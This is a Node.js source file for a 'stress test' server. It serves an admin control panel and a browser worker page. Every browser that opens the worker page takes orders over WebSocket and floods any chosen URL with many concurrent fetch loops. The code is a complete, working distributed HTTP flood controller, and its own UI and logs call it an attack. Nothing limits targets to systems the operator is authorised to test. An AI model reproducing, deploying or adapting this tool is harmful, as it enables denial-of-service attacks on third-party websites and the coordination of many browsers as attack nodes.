const WebSocket = require('ws');
const http = require('http');

const PORT = process.env.PORT || 8080;
const clients = new Map();
let clientIdCounter = 0;
let activeTest = null;

// Admin HTML
const adminHTML = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stress Test Control Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0f0f23;
            color: #e0e0e0;
            padding: 20px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 {
            color: #00ff41;
            margin-bottom: 30px;
            text-shadow: 0 0 10px #00ff41;
        }
        .status-bar {
            background: #1a1a2e;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            border-left: 4px solid #00ff41;
        }
        .status-item {
            display: inline-block;
            margin-right: 30px;
            font-size: 14px;
        }
        .status-label { color: #888; }
        .status-value { 
            color: #00ff41;
            font-weight: bold;
            font-size: 18px;
        }
        .config-panel {
            background: #1a1a2e;
            padding: 25px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #aaa;
            font-size: 14px;
        }
        input, select {
            width: 100%;
            padding: 10px;
            background: #0f0f23;
            border: 1px solid #333;
            border-radius: 4px;
            color: #e0e0e0;
            font-size: 14px;
        }
        input:focus, select:focus {
            outline: none;
            border-color: #00ff41;
        }
        .btn {
            padding: 12px 30px;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            margin-right: 10px;
            transition: all 0.3s;
        }
        .btn-start {
            background: #00ff41;
            color: #0f0f23;
            font-weight: bold;
        }
        .btn-start:hover { background: #00cc33; }
        .btn-stop {
            background: #ff4444;
            color: white;
        }
        .btn-stop:hover { background: #cc0000; }
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        .workers-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 15px;
            margin-top: 20px;
        }
        .worker-card {
            background: #1a1a2e;
            padding: 15px;
            border-radius: 8px;
            border-left: 4px solid #555;
        }
        .worker-card.active { border-left-color: #00ff41; }
        .worker-id {
            font-weight: bold;
            color: #00ff41;
            margin-bottom: 10px;
        }
        .worker-stat {
            font-size: 12px;
            margin: 5px 0;
            color: #aaa;
            word-break: break-all;
        }
        .worker-stat span {
            color: #fff;
            font-weight: bold;
        }
        .total-stats {
            background: #16213e;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
        }
        .stat-box {
            text-align: center;
        }
        .stat-label {
            color: #888;
            font-size: 12px;
            text-transform: uppercase;
        }
        .stat-value {
            font-size: 32px;
            font-weight: bold;
            color: #00ff41;
            margin-top: 5px;
        }
        .connection-status {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 10px 20px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
        }
        .connection-status.connected {
            background: #00ff41;
            color: #0f0f23;
        }
        .connection-status.disconnected {
            background: #ff4444;
            color: white;
        }
        .summary-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 9999;
            align-items: center;
            justify-content: center;
        }
        .summary-modal.show {
            display: flex;
        }
        .summary-content {
            background: #1a1a2e;
            border: 2px solid #00ff41;
            border-radius: 10px;
            padding: 30px;
            max-width: 500px;
            width: 90%;
            box-shadow: 0 0 30px rgba(0, 255, 65, 0.5);
        }
        .summary-title {
            color: #00ff41;
            font-size: 24px;
            font-weight: bold;
            text-align: center;
            margin-bottom: 20px;
            text-shadow: 0 0 10px #00ff41;
        }
        .summary-stat {
            display: flex;
            justify-content: space-between;
            padding: 15px;
            border-bottom: 1px solid #333;
            font-size: 16px;
        }
        .summary-stat:last-child {
            border-bottom: none;
        }
        .summary-label {
            color: #aaa;
        }
        .summary-value {
            color: #00ff41;
            font-weight: bold;
            font-size: 20px;
        }
        .summary-close {
            margin-top: 20px;
            width: 100%;
            padding: 12px;
            background: #00ff41;
            color: #0f0f23;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        .summary-close:hover {
            background: #00cc33;
        }
        .worker-notification {
            position: fixed;
            top: 80px;
            right: 20px;
            padding: 15px 25px;
            background: #00ff41;
            color: #0f0f23;
            border-radius: 8px;
            font-weight: bold;
            animation: slideIn 0.3s ease-out;
            z-index: 1000;
        }
        @keyframes slideIn {
            from {
                transform: translateX(400px);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
    </style>
</head>
<body>
    <div class="connection-status" id="connStatus">DISCONNECTED</div>
    
    <div class="summary-modal" id="summaryModal">
        <div class="summary-content">
            <div class="summary-title">⚡ ATTACK SUMMARY</div>
            <div class="summary-stat">
                <span class="summary-label">Total Requests Sent:</span>
                <span class="summary-value" id="sumTotalSent">0</span>
            </div>
            <div class="summary-stat">
                <span class="summary-label">Successful:</span>
                <span class="summary-value" id="sumSuccess" style="color: #00ff41;">0</span>
            </div>
            <div class="summary-stat">
                <span class="summary-label">Failed:</span>
                <span class="summary-value" id="sumFailed" style="color: #ff4444;">0</span>
            </div>
            <div class="summary-stat">
                <span class="summary-label">Success Rate:</span>
                <span class="summary-value" id="sumRate">0%</span>
            </div>
            <div class="summary-stat">
                <span class="summary-label">Workers Used:</span>
                <span class="summary-value" id="sumWorkers">0</span>
            </div>
            <button class="summary-close" onclick="closeSummary()">CLOSE</button>
        </div>
    </div>
    
    <div class="container">
        <h1>⚡ Stress Test Control Panel</h1>
        
        <div class="status-bar">
            <div class="status-item">
                <span class="status-label">Workers:</span>
                <span class="status-value" id="workerCount">0</span>
            </div>
            <div class="status-item">
                <span class="status-label">Status:</span>
                <span class="status-value" id="testStatus">IDLE</span>
            </div>
        </div>

        <div class="config-panel">
            <h2 style="margin-bottom: 20px; color: #00ff41;">Test Configuration</h2>
            <div class="form-group">
                <label>Target URL</label>
                <input type="text" id="targetUrl" placeholder="https://example.com" value="https://httpbin.org/get">
            </div>
            <div class="form-group">
                <label>Request Method</label>
                <select id="method">
                    <option value="GET">GET</option>
                    <option value="POST">POST</option>
                    <option value="PUT">PUT</option>
                    <option value="DELETE">DELETE</option>
                </select>
            </div>
            <div class="form-group">
                <label>Attack Duration (seconds)</label>
                <input type="number" id="duration" value="30" min="1">
            </div>
            <div class="form-group">
                <label>Threads per Worker</label>
                <input type="number" id="threads" value="10" min="1" max="1000">
            </div>
            <div class="form-group">
                <label>Delay between requests (ms)</label>
                <input type="number" id="delay" value="1" min="0">
            </div>
            
            <div style="margin-top: 20px;">
                <button class="btn btn-start" id="startBtn" onclick="startTest()">START TEST</button>
                <button class="btn btn-stop" id="stopBtn" onclick="stopTest()" disabled>STOP TEST</button>
            </div>
        </div>

        <div class="total-stats">
            <div class="stat-box">
                <div class="stat-label">Total Sent</div>
                <div class="stat-value" id="totalSent">0</div>
            </div>
            <div class="stat-box">
                <div class="stat-label">Success</div>
                <div class="stat-value" id="totalSuccess" style="color: #00ff41;">0</div>
            </div>
            <div class="stat-box">
                <div class="stat-label">Failed</div>
                <div class="stat-value" id="totalFailed" style="color: #ff4444;">0</div>
            </div>
            <div class="stat-box">
                <div class="stat-label">Success Rate</div>
                <div class="stat-value" id="successRate">0%</div>
            </div>
        </div>

        <h2 style="margin: 30px 0 15px; color: #00ff41;">Connected Workers</h2>
        <div class="workers-grid" id="workersGrid"></div>
    </div>

    <script>
        let ws;
        let workers = [];
        let currentConfig = null;

        function connect() {
            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsUrl = protocol + '//' + window.location.host;
            
            ws = new WebSocket(wsUrl);
            
            ws.onopen = () => {
                document.getElementById('connStatus').textContent = 'CONNECTED';
                document.getElementById('connStatus').className = 'connection-status connected';
                ws.send(JSON.stringify({ type: 'identify', role: 'admin' }));
                requestStatus();
            };

            ws.onmessage = (event) => {
                const data = JSON.parse(event.data);
                handleMessage(data);
            };

            ws.onclose = () => {
                document.getElementById('connStatus').textContent = 'DISCONNECTED';
                document.getElementById('connStatus').className = 'connection-status disconnected';
                setTimeout(connect, 2000);
            };
        }

        function handleMessage(data) {
            switch(data.type) {
                case 'status':
                    workers = data.workers || [];
                    updateWorkersDisplay();
                    document.getElementById('workerCount').textContent = workers.length;
                    break;
                case 'worker_stats':
                    updateWorkerStats(data.workerId, data.stats);
                    break;
                case 'test_started':
                    document.getElementById('testStatus').textContent = 'RUNNING';
                    document.getElementById('startBtn').disabled = true;
                    document.getElementById('stopBtn').disabled = false;
                    break;
                case 'test_stopped':
                    document.getElementById('testStatus').textContent = 'IDLE';
                    document.getElementById('startBtn').disabled = false;
                    document.getElementById('stopBtn').disabled = true;
                    if (data.finalStats) {
                        data.finalStats.forEach(w => updateWorkerStats(w.id, w.stats));
                    }
                    if (data.summary) {
                        showSummary(data.summary);
                    }
                    break;
                case 'worker_connected':
                    showNotification('⚡ New worker connected!');
                    requestStatus();
                    break;
                case 'error':
                    alert(data.message);
                    break;
            }
        }

        function updateWorkerStats(workerId, stats) {
            const worker = workers.find(w => w.id === workerId);
            if (worker) {
                worker.stats = stats;
                updateWorkersDisplay();
            }
        }

        function updateWorkersDisplay() {
            const grid = document.getElementById('workersGrid');
            
            if (workers.length === 0) {
                grid.innerHTML = '<div style="grid-column: 1/-1; text-align: center; color: #666; padding: 40px;">No workers connected. Open /worker</div>';
                return;
            }
            
            let totalSent = 0, totalSuccess = 0, totalFailed = 0;
            
            grid.innerHTML = workers.map(w => {
                totalSent += w.stats.sent || 0;
                totalSuccess += w.stats.success || 0;
                totalFailed += w.stats.failed || 0;
                
                return \`
                    <div class="worker-card \${w.status === 'active' ? 'active' : ''}">
                        <div class="worker-id">Worker #\${w.id}</div>
                        <div class="worker-stat">Status: <span>\${w.status.toUpperCase()}</span></div>
                        <div class="worker-stat">Threads: <span>\${currentConfig ? currentConfig.threads : '-'}</span></div>
                        <div class="worker-stat">Sent: <span>\${w.stats.sent || 0}</span></div>
                        <div class="worker-stat">Success: <span>\${w.stats.success || 0}</span></div>
                        <div class="worker-stat">Failed: <span>\${w.stats.failed || 0}</span></div>
                    </div>
                \`;
            }).join('');
            
            document.getElementById('totalSent').textContent = totalSent;
            document.getElementById('totalSuccess').textContent = totalSuccess;
            document.getElementById('totalFailed').textContent = totalFailed;
            
            const rate = totalSent > 0 ? ((totalSuccess / totalSent) * 100).toFixed(1) : 0;
            document.getElementById('successRate').textContent = rate + '%';
        }

        function startTest() {
            const config = {
                target: document.getElementById('targetUrl').value,
                method: document.getElementById('method').value,
                duration: parseInt(document.getElementById('duration').value),
                threads: parseInt(document.getElementById('threads').value),
                delay: parseInt(document.getElementById('delay').value)
            };
            
            if (!config.target) {
                alert('Please enter a target URL');
                return;
            }
            
            currentConfig = config;
            ws.send(JSON.stringify({ type: 'start_test', config }));
        }

        function stopTest() {
            ws.send(JSON.stringify({ type: 'stop_test' }));
        }

        function requestStatus() {
            if (ws && ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({ type: 'get_status' }));
            }
        }

        function showNotification(message) {
            const notif = document.createElement('div');
            notif.className = 'worker-notification';
            notif.textContent = message;
            document.body.appendChild(notif);
            
            setTimeout(() => {
                notif.style.opacity = '0';
                notif.style.transform = 'translateX(400px)';
                setTimeout(() => notif.remove(), 300);
            }, 3000);
        }

        function showSummary(summary) {
            document.getElementById('sumTotalSent').textContent = summary.totalSent;
            document.getElementById('sumSuccess').textContent = summary.totalSuccess;
            document.getElementById('sumFailed').textContent = summary.totalFailed;
            document.getElementById('sumRate').textContent = summary.successRate + '%';
            document.getElementById('sumWorkers').textContent = summary.workersUsed;
            document.getElementById('summaryModal').className = 'summary-modal show';
        }

        function closeSummary() {
            document.getElementById('summaryModal').className = 'summary-modal';
        }

        setInterval(requestStatus, 2000);
        connect();
    </script>
</body>
</html>`;

// Worker HTML
const workerHTML = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stress Test Worker</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #000;
            color: #00ff41;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 600px;
            width: 100%;
            background: #0a0a0a;
            border: 2px solid #00ff41;
            border-radius: 10px;
            padding: 30px;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
        }
        h1 {
            text-align: center;
            margin-bottom: 20px;
            font-size: 24px;
            text-shadow: 0 0 10px #00ff41;
        }
        .status {
            text-align: center;
            margin: 20px 0;
            font-size: 18px;
            padding: 15px;
            background: #111;
            border-radius: 5px;
        }
        .status.idle { color: #888; }
        .status.active { 
            color: #00ff41;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.6; }
        }
        .stats {
            margin-top: 30px;
        }
        .stat-row {
            display: flex;
            justify-content: space-between;
            padding: 10px;
            border-bottom: 1px solid #222;
        }
        .stat-label { color: #888; }
        .stat-value { 
            color: #00ff41;
            font-weight: bold;
        }
        .log {
            margin-top: 30px;
            background: #111;
            border-radius: 5px;
            padding: 15px;
            max-height: 200px;
            overflow-y: auto;
            font-size: 12px;
        }
        .log-entry {
            margin: 5px 0;
            opacity: 0.8;
        }
        .connection-badge {
            text-align: center;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        .connection-badge.connected {
            background: #003311;
            color: #00ff41;
        }
        .connection-badge.disconnected {
            background: #330000;
            color: #ff4444;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚡ WORKER NODE ⚡</h1>
        
        <div class="connection-badge" id="connBadge">
            <span id="connText">DISCONNECTED</span>
        </div>
        
        <div class="status idle" id="status">IDLE - Waiting for commands...</div>
        
        <div class="stats">
            <div class="stat-row">
                <span class="stat-label">Requests Sent:</span>
                <span class="stat-value" id="sentCount">0</span>
            </div>
            <div class="stat-row">
                <span class="stat-label">Success:</span>
                <span class="stat-value" id="successCount">0</span>
            </div>
            <div class="stat-row">
                <span class="stat-label">Failed:</span>
                <span class="stat-value" id="failedCount">0</span>
            </div>
            <div class="stat-row">
                <span class="stat-label">Target:</span>
                <span class="stat-value" id="target">-</span>
            </div>
        </div>
        
        <div class="log" id="log"></div>
    </div>

    <script>
        let ws;
        let isRunning = false;
        let stats = { sent: 0, success: 0, failed: 0 };
        let currentConfig = null;

        function connect() {
            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            ws = new WebSocket(protocol + '//' + window.location.host);
            
            ws.onopen = () => {
                log('Connected to command server');
                updateConnectionStatus(true);
                ws.send(JSON.stringify({ type: 'identify', role: 'worker' }));
            };

            ws.onmessage = async (event) => {
                const data = JSON.parse(event.data);
                
                if (data.type === 'ready') {
                    log('Worker ready - awaiting orders');
                }
                
                if (data.type === 'start') {
                    log('Received attack orders');
                    currentConfig = data.config;
                    document.getElementById('target').textContent = currentConfig.target;
                    startAttack(currentConfig);
                }
                
                if (data.type === 'stop') {
                    log('Stop command received');
                    stopAttack();
                }
            };

            ws.onclose = () => {
                log('Disconnected from server');
                updateConnectionStatus(false);
                stopAttack();
                setTimeout(connect, 2000);
            };
        }

        async function startAttack(config) {
            if (isRunning) return;
            
            isRunning = true;
            stats = { sent: 0, success: 0, failed: 0 };
            updateStatus('active', 'ATTACKING ' + config.target);
            
            log(\`Starting attack: \${config.duration}s with \${config.threads} threads\`);
            
            const statsInterval = setInterval(() => {
                if (isRunning) {
                    updateStatsDisplay();
                    reportStats();
                }
            }, 500);
            
            const threads = [];
            for (let i = 0; i < config.threads; i++) {
                threads.push(attackThread(config));
            }
            
            await Promise.all(threads);
            clearInterval(statsInterval);
            
            reportStats();
            updateStatsDisplay();
            log('Attack completed');
            updateStatus('idle', 'IDLE - Completed');
        }

        async function attackThread(config) {
            while (isRunning) {
                await sendRequest(config);
                if (config.delay > 0) {
                    await sleep(config.delay);
                }
            }
        }

        async function sendRequest(config) {
            if (!isRunning) return;
            
            stats.sent++;
            
            try {
                await fetch(config.target, {
                    method: config.method,
                    mode: 'no-cors'
                });
                stats.success++;
            } catch (error) {
                stats.failed++;
            }
        }

        function stopAttack() {
            if (!isRunning) return;
            
            log('Stopping attack...');
            isRunning = false;
            reportStats();
            updateStatsDisplay();
            updateStatus('idle', 'IDLE - Stopped');
        }

        function reportStats() {
            if (ws && ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({
                    type: 'stats',
                    stats: stats
                }));
            }
        }

        function updateStatsDisplay() {
            document.getElementById('sentCount').textContent = stats.sent;
            document.getElementById('successCount').textContent = stats.success;
            document.getElementById('failedCount').textContent = stats.failed;
        }

        function updateStatus(className, text) {
            const el = document.getElementById('status');
            el.className = 'status ' + className;
            el.textContent = text;
        }

        function updateConnectionStatus(connected) {
            const badge = document.getElementById('connBadge');
            const text = document.getElementById('connText');
            
            if (connected) {
                badge.className = 'connection-badge connected';
                text.textContent = 'CONNECTED';
            } else {
                badge.className = 'connection-badge disconnected';
                text.textContent = 'DISCONNECTED';
            }
        }

        function log(message) {
            const logEl = document.getElementById('log');
            const time = new Date().toLocaleTimeString();
            const entry = document.createElement('div');
            entry.className = 'log-entry';
            entry.textContent = \`[\${time}] \${message}\`;
            logEl.appendChild(entry);
            logEl.scrollTop = logEl.scrollHeight;
            
            if (logEl.children.length > 50) {
                logEl.removeChild(logEl.firstChild);
            }
        }

        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        connect();
    </script>
</body>
</html>`;

// HTTP Server
const server = http.createServer((req, res) => {
  if (req.url === '/' || req.url === '/admin') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(adminHTML);
  } else if (req.url === '/client' || req.url === '/worker') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(workerHTML);
  } else {
    res.writeHead(404);
    res.end('Not found');
  }
});

// WebSocket Server
const wss = new WebSocket.Server({ 
  server,
  clientTracking: true,
  perMessageDeflate: false,
  verifyClient: (info) => true,
  handleProtocols: (protocols, request) => protocols[0]
});

function heartbeat() {
  this.isAlive = true;
}

const heartbeatInterval = setInterval(() => {
  wss.clients.forEach((ws) => {
    if (ws.isAlive === false) {
      return ws.terminate();
    }
    ws.isAlive = false;
    try {
      ws.ping();
    } catch (e) {
      console.error('[!] Ping error:', e.message);
    }
  });
}, 30000);

wss.on('close', () => {
  clearInterval(heartbeatInterval);
});

wss.on('connection', (ws) => {
  ws.isAlive = true;
  ws.on('pong', heartbeat);
  
  const clientId = ++clientIdCounter;
  const clientInfo = {
    id: clientId,
    ws: ws,
    type: null,
    status: 'idle',
    stats: { sent: 0, success: 0, failed: 0 }
  };
  
  clients.set(clientId, clientInfo);
  console.log(`[+] Client #${clientId} connected`);

  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);
      
      if (data.type === 'identify') {
        clientInfo.type = data.role;
        console.log(`[i] Client #${clientId} -> ${data.role}`);
        
        if (data.role === 'admin') {
          sendStatus(ws);
        } else if (data.role === 'worker') {
          ws.send(JSON.stringify({ type: 'ready' }));
          broadcastToAdmins({ type: 'worker_connected', workerId: clientId });
          setTimeout(() => {
            clients.forEach((client) => {
              if (client.type === 'admin' && client.ws.readyState === WebSocket.OPEN) {
                sendStatus(client.ws);
              }
            });
          }, 100);
        }
      }
      
      if (data.type === 'start_test' && clientInfo.type === 'admin') {
        startStressTest(data.config);
      }
      
      if (data.type === 'stop_test' && clientInfo.type === 'admin') {
        stopStressTest();
      }
      
      if (data.type === 'get_status' && clientInfo.type === 'admin') {
        sendStatus(ws);
      }
      
      if (data.type === 'stats' && clientInfo.type === 'worker') {
        clientInfo.stats = data.stats;
        broadcastToAdmins({
          type: 'worker_stats',
          workerId: clientId,
          stats: data.stats
        });
      }
      
    } catch (err) {
      console.error('[!] Message error:', err);
    }
  });

  ws.on('close', () => {
    console.log(`[-] Client #${clientId} disconnected`);
    clients.delete(clientId);
    broadcastToAdmins({ type: 'client_disconnected', clientId });
  });

  ws.on('error', (error) => {
    console.error(`[!] WebSocket error:`, error.message);
  });
});

function startStressTest(config) {
  activeTest = config;
  console.log(`[!] Starting stress test on ${config.target}`);
  
  const workers = Array.from(clients.values()).filter(c => c.type === 'worker');
  
  if (workers.length === 0) {
    broadcastToAdmins({ type: 'error', message: 'No workers connected' });
    return;
  }
  
  console.log(`[*] Attack started with ${workers.length} workers for ${config.duration}s`);
  
  workers.forEach(worker => {
    worker.status = 'active';
    worker.stats = { sent: 0, success: 0, failed: 0 };
    worker.ws.send(JSON.stringify({ type: 'start', config: config }));
  });
  
  broadcastToAdmins({ type: 'test_started', workers: workers.length, config: config });
  
  setTimeout(() => {
    if (activeTest) {
      console.log('[!] Attack duration completed - stopping');
      stopStressTest();
    }
  }, config.duration * 1000);
}

function stopStressTest() {
  if (!activeTest) return;
  
  console.log('[!] Stopping stress test');
  activeTest = null;
  
  const workers = Array.from(clients.values()).filter(c => c.type === 'worker');
  
  const finalStats = workers.map(w => ({ id: w.id, stats: { ...w.stats } }));
  
  let totalSent = 0, totalSuccess = 0, totalFailed = 0;
  finalStats.forEach(w => {
    totalSent += w.stats.sent || 0;
    totalSuccess += w.stats.success || 0;
    totalFailed += w.stats.failed || 0;
  });
  
  console.log('╔════════════════════════════════════════╗');
  console.log('║       ATTACK SUMMARY REPORT            ║');
  console.log('╠════════════════════════════════════════╣');
  console.log(`║  Total Requests: ${totalSent.toString().padStart(20)} ║`);
  console.log(`║  Successful:     ${totalSuccess.toString().padStart(20)} ║`);
  console.log(`║  Failed:         ${totalFailed.toString().padStart(20)} ║`);
  console.log(`║  Success Rate:   ${totalSent > 0 ? ((totalSuccess/totalSent)*100).toFixed(1) : '0'}%`.padEnd(41) + '║');
  console.log(`║  Workers Used:   ${workers.length.toString().padStart(20)} ║`);
  console.log('╚════════════════════════════════════════╝');
  
  workers.forEach(worker => {
    worker.status = 'idle';
    if (worker.ws.readyState === WebSocket.OPEN) {
      worker.ws.send(JSON.stringify({ type: 'stop' }));
    }
  });
  
  broadcastToAdmins({ 
    type: 'test_stopped',
    finalStats,
    summary: {
      totalSent,
      totalSuccess,
      totalFailed,
      successRate: totalSent > 0 ? ((totalSuccess/totalSent)*100).toFixed(1) : 0,
      workersUsed: workers.length
    }
  });
}

function sendStatus(ws) {
  const workers = Array.from(clients.values())
    .filter(c => c.type === 'worker' && c.ws.readyState === WebSocket.OPEN)
    .map(c => ({ id: c.id, status: c.status, stats: c.stats }));
  
  try {
    ws.send(JSON.stringify({ type: 'status', workers: workers, activeTest: activeTest }));
  } catch (e) {
    console.error('[!] Failed to send status:', e.message);
  }
}

function broadcastToAdmins(data) {
  clients.forEach(client => {
    if (client.type === 'admin' && client.ws.readyState === WebSocket.OPEN) {
      client.ws.send(JSON.stringify(data));
    }
  });
}

server.listen(PORT, '0.0.0.0', () => {
  console.log(`
╔════════════════════════════════════════╗
║   STRESS TEST SERVER RUNNING           ║
╠════════════════════════════════════════╣
║  Port: ${PORT}                            ║
║  Admin:  /admin                        ║
║  Worker: /worker                       ║
╚════════════════════════════════════════╝
  `);
});
